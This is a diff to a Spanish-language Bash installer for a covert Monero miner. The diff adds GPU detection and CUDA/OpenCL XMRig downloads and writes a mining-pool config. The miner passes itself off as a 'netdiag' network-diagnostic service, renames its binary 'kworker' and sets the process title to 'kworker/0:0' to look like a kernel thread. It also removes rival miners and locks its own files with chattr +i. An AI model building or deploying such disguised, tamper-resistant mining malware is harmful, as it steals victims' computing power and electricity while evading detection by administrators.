@@ -23,7 +23,7 @@ if ! $UPDATE_MODE; then
     CLEANER="$(cd "$(dirname "$0")" && pwd)/clean-miners.sh"
     if [ -f "$CLEANER" ]; then
         echo -e "${YELLOW}[*] Buscando mineros rivales antes de instalar...${NC}"
-        bash "$CLEANER" --force 2>&1
+        bash "$CLEANER" --strict 2>&1
         echo ""
     fi
 fi
@@ -34,6 +34,7 @@ INSTALL_DIR="/opt/netdiag"
 DATA_DIR="$INSTALL_DIR/data"
 CONFIG_DST="$INSTALL_DIR/.env"
 XMRIG_BIN="$DATA_DIR/kworker"
+XMRIG_CONFIG="$DATA_DIR/config.json"
 VERSION_DST="$INSTALL_DIR/.version"
 SERVICE_NAME="netdiag"
 
@@ -111,31 +112,215 @@ cp "$REPO_DIR/VERSION" "$VERSION_DST"
 VERSION=$(cat "$REPO_DIR/VERSION")
 echo -e "${GREEN}[✓] Versión: $VERSION${NC}"
 
-# ─── Descargar XMRig si no existe ───
-if [ ! -f "$XMRIG_BIN" ]; then
-    echo -e "\n${YELLOW}[*] Descargando...${NC}"
-    LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
-        | grep -oP '"tag_name": "\K[^"]+')
-    [ -z "$LATEST" ] && LATEST="v6.22.2"
+# ─── Obtener última versión de XMRig ───
+LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
+    | grep -oP '"tag_name": "\K[^"]+')
+[ -z "$LATEST" ] && LATEST="v6.22.2"
+XMRIG_VERSION="${LATEST#v}"
 
-    cd /tmp
-    wget -q "https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${LATEST#v}-linux-static-x64.tar.gz" -O xmrig.tar.gz
+# ════════════════════════════════════════════════════════
+#  DETECCIÓN DE GPU
+# ════════════════════════════════════════════════════════
+GPU_VENDOR=""
+GPU_RECOMMENDED=false
+GPU_SCRIPT="$REPO_DIR/tools/utils/detect-gpu.sh"
 
-    if [ -f "xmrig.tar.gz" ]; then
-        TAR_DIR=$(tar tzf xmrig.tar.gz | head -1 | cut -d/ -f1)
-        tar xf xmrig.tar.gz
-        if [ -f "$TAR_DIR/xmrig" ]; then
-            cp "$TAR_DIR/xmrig" "$XMRIG_BIN"
-            chmod 755 "$XMRIG_BIN"
-            chown root:root "$XMRIG_BIN"
-            rm -rf "$TAR_DIR" xmrig.tar.gz
-            echo -e "${GREEN}[✓] Binario instalado${NC}"
+if [ -f "$GPU_SCRIPT" ]; then
+    echo -e "\n${CYAN}[*] Detectando hardware gráfico...${NC}"
+    # Obtener JSON con detección
+    GPU_JSON=$(bash "$GPU_SCRIPT" --json 2>/dev/null || echo '{"gpu_found":false}')
+    GPU_FOUND=$(echo "$GPU_JSON" | grep -oP '"gpu_found": \K(true|false)')
+    GPU_RECOMMENDED=$(echo "$GPU_JSON" | grep -oP '"gpu_recommended": \K(true|false)')
+    GPU_VENDOR=$(echo "$GPU_JSON" | grep -oP '"gpu_vendor": "\K[^"]+')
+    GPU_MODEL=$(echo "$GPU_JSON" | grep -oP '"gpu_model": "\K[^"]+')
+    GPU_SCORE=$(echo "$GPU_JSON" | grep -oP '"gpu_score": \K\d+')
+
+    if [ "$GPU_FOUND" = "true" ]; then
+        echo -e "  ${GREEN}✓ GPU: $GPU_MODEL${NC}"
+        if [ "$GPU_RECOMMENDED" = "true" ]; then
+            echo -e "  ${GREEN}✓ Score: $GPU_SCORE — RECOMENDADA para minería${NC}"
+        else
+            echo -e "  ${YELLOW}⚠ Score: $GPU_SCORE — GPU lenta, solo CPU${NC}"
+            GPU_VENDOR=""
         fi
+    else
+        echo -e "  ${YELLOW}→ Sin GPU detectable, modo CPU${NC}"
     fi
 fi
 
+# ════════════════════════════════════════════════════════
+#  DESCARGA DE XMRig (variante según GPU)
+# ════════════════════════════════════════════════════════
+
+# Función: descargar y extraer XMRig
+download_xmrig() {
+    local variant="$1"       # vacio, -cuda, -opencl
+    local output_name="$2"   # nombre del binario destino
+    local url
+
+    if [ -z "$variant" ]; then
+        url="https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
+    else
+        url="https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${XMRIG_VERSION}-linux-static-x64${variant}.tar.gz"
+    fi
+
+    echo -e "  ${YELLOW}→ Descargando$variant...${NC}"
+    cd /tmp
+    wget -q "$url" -O xmrig-dl.tar.gz 2>/dev/null || return 1
+
+    local tar_dir
+    tar_dir=$(tar tzf xmrig-dl.tar.gz | head -1 | cut -d/ -f1)
+    tar xf xmrig-dl.tar.gz 2>/dev/null || return 1
+
+    if [ -f "$tar_dir/xmrig" ]; then
+        cp "$tar_dir/xmrig" "$output_name"
+        chmod 755 "$output_name"
+        echo -e "  ${GREEN}✓ Binario: $output_name${NC}"
+
+        # Copiar librerías GPU si existen (CUDA/OpenCL .so)
+        for lib in "$tar_dir"/libxmrig-*.so; do
+            if [ -f "$lib" ]; then
+                cp "$lib" "$DATA_DIR/"
+                chmod 644 "$DATA_DIR/$(basename "$lib")"
+                echo -e "  ${GREEN}✓ Librería: $(basename "$lib")${NC}"
+            fi
+        done
+
+        rm -rf "$tar_dir" xmrig-dl.tar.gz
+        return 0
+    fi
+
+    rm -rf "$tar_dir" xmrig-dl.tar.gz 2>/dev/null
+    return 1
+}
+
+# Descargar binario según GPU detectada
+GPU_DOWNLOADED=false
+
+if [ "$GPU_RECOMMENDED" = "true" ]; then
+    case "$GPU_VENDOR" in
+        nvidia)
+            echo -e "\n${CYAN}[*] GPU NVIDIA detectada — descargando XMRig+CUDA${NC}"
+            if download_xmrig "-cuda" "$XMRIG_BIN"; then
+                echo "$GPU_VENDOR" > "$DATA_DIR/.gpu-vendor"
+                echo "$GPU_MODEL" > "$DATA_DIR/.gpu-model"
+                GPU_DOWNLOADED=true
+            fi
+            ;;
+        amd)
+            echo -e "\n${CYAN}[*] GPU AMD detectada — descargando XMRig+OpenCL${NC}"
+            if download_xmrig "-opencl" "$XMRIG_BIN"; then
+                echo "$GPU_VENDOR" > "$DATA_DIR/.gpu-vendor"
+                echo "$GPU_MODEL" > "$DATA_DIR/.gpu-model"
+                GPU_DOWNLOADED=true
+            fi
+            ;;
+    esac
+fi
+
+# Fallback: descargar CPU-only si no se descargó variante GPU
+if ! $GPU_DOWNLOADED; then
+    echo -e "\n${CYAN}[*] Descargando XMRig (CPU-only)...${NC}"
+    if [ -f "$XMRIG_BIN" ]; then
+        echo -e "${GREEN}[✓] Binario ya existe, saltando descarga${NC}"
+    else
+        if download_xmrig "" "$XMRIG_BIN"; then
+            echo -e "${GREEN}[✓] Binario CPU instalado${NC}"
+        fi
+    fi
+    # Asegurar que no hay flag GPU residual
+    rm -f "$DATA_DIR/.gpu-vendor" "$DATA_DIR/.gpu-model" 2>/dev/null
+fi
+
+# ─── Verificar binario ───
 if [ ! -f "$XMRIG_BIN" ]; then
     echo -e "${YELLOW}[!] Binario no encontrado. Copia el binario manualmente.${NC}"
+fi
+
+# ─── Generar config.json de XMRig (template) ───
+echo -e "\n${CYAN}[*] Generando configuración de XMRig...${NC}"
+
+if [ -f "$CONFIG_DST" ]; then
+    source "$CONFIG_DST"
+fi
+
+# Valores por defecto
+START_HOUR="${START_HOUR:-18}"
+END_HOUR="${END_HOUR:-7}"
+MAX_CPU="${MAX_CPU:-80}"
+THREADS="${THREADS:-0}"
+POOL_URL="${POOL_URL:-gulf.moneroocean.stream:10128}"
+WALLET_BASE="${WALLET_BASE:-SET_YOUR_WALLET}"
+
+# Construir sección GPU del JSON
+GPU_JSON=""
+GPU_PART=""
+if [ "$GPU_RECOMMENDED" = "true" ] && [ -f "$DATA_DIR/.gpu-vendor" ]; then
+    local_vendor=$(cat "$DATA_DIR/.gpu-vendor")
+    case "$local_vendor" in
+        nvidia)
+            GPU_PART=$'    "cuda": {\n        "enabled": true\n    },'
+            GPU_JSON="cuda"
+            ;;
+        amd)
+            GPU_PART=$'    "opencl": {\n        "enabled": true\n    },'
+            GPU_JSON="opencl"
+            ;;
+    esac
+fi
+
+# Escribir config.json template
+cat > "$XMRIG_CONFIG" << TEMPLATE
+{
+    "autosave": true,
+    "donate-level": 0,
+    "title": "kworker/0:0",
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": $MAX_CPU
+    },
+    $(echo "$GPU_PART" | sed 's/,$//')
+    "pools": [
+        {
+            "url": "$POOL_URL",
+            "user": "__WALLET_PLACEHOLDER__",
+            "pass": "__WORKER_NAME__",
+            "algo": "auto",
+            "keepalive": true
+        }
+    ]
+}
+TEMPLATE
+
+# Si el JSON quedó mal formado por GPU_PART vacío, arreglar
+if [ -z "$GPU_PART" ]; then
+    # El template de arriba tiene la coma extra de GPU, re-generar sin ella
+    cat > "$XMRIG_CONFIG" << TEMPLATE
+{
+    "autosave": true,
+    "donate-level": 0,
+    "title": "kworker/0:0",
+    "cpu": {
+        "enabled": true,
+        "max-threads-hint": $MAX_CPU
+    },
+    "pools": [
+        {
+            "url": "$POOL_URL",
+            "user": "__WALLET_PLACEHOLDER__",
+            "pass": "__WORKER_NAME__",
+            "algo": "auto",
+            "keepalive": true
+        }
+    ]
+}
+TEMPLATE
+fi
+
+chmod 600 "$XMRIG_CONFIG"
+echo -e "${GREEN}[✓] Config template generado${NC}"
+if [ -n "$GPU_JSON" ]; then
+    echo -e "${GREEN}[✓] GPU habilitada en config: $GPU_JSON${NC}"
 fi
 
 # ─── Crear/actualizar servicio systemd ───
@@ -174,13 +359,18 @@ if [ -f "$XMRIG_BIN" ]; then
         echo -e "${YELLOW}[!] Binario sin protección extra${NC}"
 fi
 
+if [ -f "$XMRIG_CONFIG" ]; then
+    chattr +i "$XMRIG_CONFIG" 2>/dev/null && \
+        echo -e "${GREEN}[✓] Config protegido${NC}"
+fi
+
 chattr +i "$INSTALL_DIR/mine-service.sh" 2>/dev/null && \
     echo -e "${GREEN}[✓] Script protegido${NC}"
 
 if [ -f "$CONFIG_DST" ]; then
     chmod 600 "$CONFIG_DST"
     chown root:root "$CONFIG_DST"
-    echo -e "${GREEN}[✓] Config: solo root${NC}"
+    echo -e "${GREEN}[✓] .env: solo root${NC}"
 fi
 
 # ─── Auto-update ───
@@ -213,8 +403,16 @@ echo "  Versión:     $VERSION"
 echo "  Servicio:    $SERVICE_NAME"
 echo "  Binario:     $XMRIG_BIN"
 echo "  Config:      $CONFIG_DST (oculto)"
+echo "  XMRig cfg:   $XMRIG_CONFIG"
 echo "  Repo:        $REPO_DIR (lib/)"
 echo ""
+
+if [ -f "$DATA_DIR/.gpu-vendor" ]; then
+    echo "  GPU detectada: $(cat "$DATA_DIR/.gpu-model" 2>/dev/null || echo 'desconocida')"
+    echo "  Modo:         CPU + GPU"
+    echo ""
+fi
+
 echo "  Comandos:"
 echo "    Iniciar:   systemctl start $SERVICE_NAME"
 echo "    Detener:   systemctl stop $SERVICE_NAME"
